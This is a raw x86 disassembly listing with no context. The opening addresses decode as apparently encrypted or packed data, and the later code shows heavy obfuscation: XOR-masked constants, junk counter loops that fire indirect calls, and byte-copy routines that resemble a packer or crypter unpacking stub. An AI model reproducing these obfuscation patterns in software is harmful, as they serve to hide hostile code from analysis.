  419022:	inc    ebp
  419023:	xlat   BYTE PTR ds:[ebx]
  419024:	loopne 0x41904c
  419026:	je     0x418ff1
  419028:	es ja  0x419021
  41902b:	shl    BYTE PTR [esi-0x28e4c3d9],1
  419031:	lods   al,BYTE PTR ds:[esi]
  419032:	fsub   DWORD PTR [eax-0x11]
  419035:	retf   0x77fc
  419038:	xor    BYTE PTR [ecx+0xb8efbb2],0x13
  41903f:	adc    BYTE PTR ds:0x8cf1f445,dh
  419045:	cwde   
  419046:	rol    BYTE PTR [edi-0x31a03777],cl
  41904c:	ror    DWORD PTR [ecx],1
  41904e:	xchg   edx,eax
  41904f:	in     eax,dx
  419050:	aas    
  419051:	in     al,dx
  419052:	jmp    0x4d25410a
  419057:	dec    ecx
  419058:	into   
  419059:	and    DWORD PTR ds:0xf8d7150b,edi
  41905f:	jno    0x41907a
  419061:	lahf   
  419062:	std    
  419063:	mov    ah,0x59
  419065:	loope  0x419091
  419067:	dec    bh
  419069:	sbb    al,0x6c
  41906b:	inc    ebp
  41906c:	mov    esp,0xad9e8dd1
  419071:	(bad)  
  419072:	mov    al,ds:0x701b8bcd
  419077:	cwde   
  419078:	fisttp QWORD PTR [esi-0x5]
  41907b:	inc    edi
  41907c:	lds    esp,FWORD PTR [ebx]
  41907e:	xor    bl,ch
  419080:	ror    BYTE PTR [edi+edi*2-0x3a81f7fe],0x3d
  419088:	adc    bl,BYTE PTR [ebp-0x14]
  41908b:	(bad)  
  41908c:	leave  
  41908d:	jo     0x419070
  41908f:	ret    0x8316
  419092:	mov    ebp,0xfc60f558
  419097:	inc    eax
  419098:	xor    DWORD PTR [ecx],esp
  41909a:	sub    al,0x5d
  41909c:	xlat   BYTE PTR ds:[ebx]
  41909d:	pop    es
  41909e:	push   ebx
  41909f:	push   edx
  4190a0:	sahf   
  4190a1:	and    al,0xc0
  4190a3:	jecxz  0x4190c9
  4190a5:	add    dh,bl
  4190a7:	outs   dx,DWORD PTR ds:[esi]
  4190a8:	sbb    BYTE PTR [ebx-0x1f09d593],bl
  4190ae:	inc    eax
  4190af:	dec    ecx
  4190b0:	test   al,0xd2
  4190b2:	jbe    0x41912d
  4190b4:	push   cs
  4190b5:	pop    edx
  4190b6:	xchg   ebp,eax
  4190b7:	sub    al,0x44
  4190b9:	inc    edx
  4190ba:	push   edx
  4190bb:	shl    dl,1
  4190bd:	in     al,dx
  4190be:	rol    DWORD PTR [ecx],0x11
  4190c1:	jmp    0x4190d6
  4190c3:	and    BYTE PTR [eax],al
  4190c5:	jo     0x4190e7
  4190c7:	cmp    DWORD PTR [ebx-0x7c28279d],esp
  4190cd:	loope  0x419081
  4190cf:	pop    esi
  4190d0:	inc    eax
  4190d1:	rcl    DWORD PTR [ebp+edx*2+0x3e],1
  4190d5:	sbb    eax,0x9a2da858
  4190da:	jl     0x419105
  4190dc:	jp     0x4190b5
  4190de:	jno    0x4190d1
  4190e0:	popf   
  4190e1:	jle    0x4190b3
  4190e3:	ja     0x4190c0
  4190e5:	xchg   edx,eax
  4190e6:	jecxz  0x419152
  4190e8:	sub    al,0x40
  4190ea:	xor    bh,ch
  4190ec:	out    dx,eax
  4190ed:	mov    al,dl
  4190ef:	and    DWORD PTR [ecx+0x66],ecx
  4190f2:	pusha  
  4190f3:	jns    0x419078
  4190f5:	out    dx,eax
  4190f6:	pusha  
  4190f7:	or     eax,0x75b93780
  4190fc:	pop    ss
  4190fd:	dec    ebx
  4190fe:	sub    BYTE PTR [eax+0x50],ah
  419101:	out    dx,eax
  419102:	fisubr WORD PTR [edi]
  419104:	jno    0x41909f
  419106:	add    DWORD PTR [edx-0x39f959b7],0x55f9e84a
  419110:	inc    cl
  419112:	or     al,0xe5
  419114:	dec    ebp
  419115:	and    DWORD PTR [ebp+0xda86ecc],ebp
  41911b:	neg    esi
  41911d:	jmp    0x419196
  41911f:	mov    DWORD PTR [bx-0x35],ecx
  419123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419124:	push   ecx
  419125:	ret    0xa293
  419128:	not    DWORD PTR [edx]
  41912a:	mov    cl,0x64
  41912c:	mov    esi,0x528e5e63
  419131:	data16 js 0x419123
  419134:	shl    DWORD PTR [edi],1
  419136:	inc    edi
  419137:	(bad)  
  419138:	jmp    0xcdb9:0x8106b7b0
  41913f:	iret   
  419140:	mov    ch,0xf4
  419142:	cmp    bh,BYTE PTR [ebx]
  419144:	sub    cl,0xdb
  419147:	inc    edi
  419148:	out    0x47,eax
  41914a:	test   cl,dh
  41914c:	fbstp  TBYTE PTR [eax]
  41914e:	cmc    
  41914f:	ins    BYTE PTR es:[edi],dx
  419150:	call   0x21e5:0xe65611ed
  419157:	fcom   QWORD PTR [edi-0x45]
  41915a:	jmp    0xba0c0bdb
  41915f:	cmp    dl,BYTE PTR [edi+0x12]
  419162:	fld    TBYTE PTR [ecx]
  419164:	mov    cl,0x2e
  419166:	loope  0x419190
  419168:	sbb    edx,DWORD PTR [edx]
  41916a:	cmp    cl,BYTE PTR [esi]
  41916c:	fmul   DWORD PTR [ebp-0x33]
  41916f:	pop    ebx
  419170:	scas   al,BYTE PTR es:[edi]
  419171:	aad    0x65
  419173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419175:	push   edx
  419176:	pop    eax
  419177:	lods   al,BYTE PTR ds:[esi]
  419178:	scas   al,BYTE PTR es:[edi]
  419179:	mov    dh,dh
  41917b:	add    eax,0x5f751e30
  419180:	scas   eax,DWORD PTR es:[edi]
  419181:	jmp    0x4191d3
  419183:	sub    DWORD PTR [ebx+0x46],0x25f59f57
  41918a:	mov    ecx,0x26324fc8
  41918f:	bnd addr16 jne 0x4191b0
  419193:	mov    dh,0xdb
  419195:	sar    BYTE PTR [ecx],0xee
  419198:	arpl   WORD PTR [edx+0x14cddc9d],si
  41919e:	push   esi
  41919f:	cs push ss
  4191a1:	repnz add al,0xa8
  4191a4:	push   eax
  4191a5:	ja     0x419200
  4191a7:	cmc    
  4191a8:	test   eax,0xabd715f9
  4191ad:	xchg   esp,eax
  4191ae:	imul   ebp,DWORD PTR [ebp-0x8],0x45
  4191b2:	ret    
  4191b3:	das    
  4191b4:	sbb    al,BYTE PTR [edi]
  4191b6:	cwde   
  4191b7:	pusha  
  4191b8:	in     eax,0xfc
  4191ba:	cmp    eax,0x8be8458b
  4191bf:	push   ebp
  4191c0:	lock xor eax,esi
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
  419236:	mov    DWORD PTR ds:0x421a22,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x4237ed
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a26
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
  41948a:	mov    DWORD PTR ds:0x421a22,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421912
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x4237e9
  419500:	mov    esi,DWORD PTR ds:0x42174a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421912
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b2e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x42351e
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421912
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421742
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x423644
  4196bb:	push   0x4235bf
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b2e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421912
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x4237f9
  4197cd:	mov    eax,ds:0x42173e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x42363a
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x4235a4
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42171e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421912
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x42379e
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
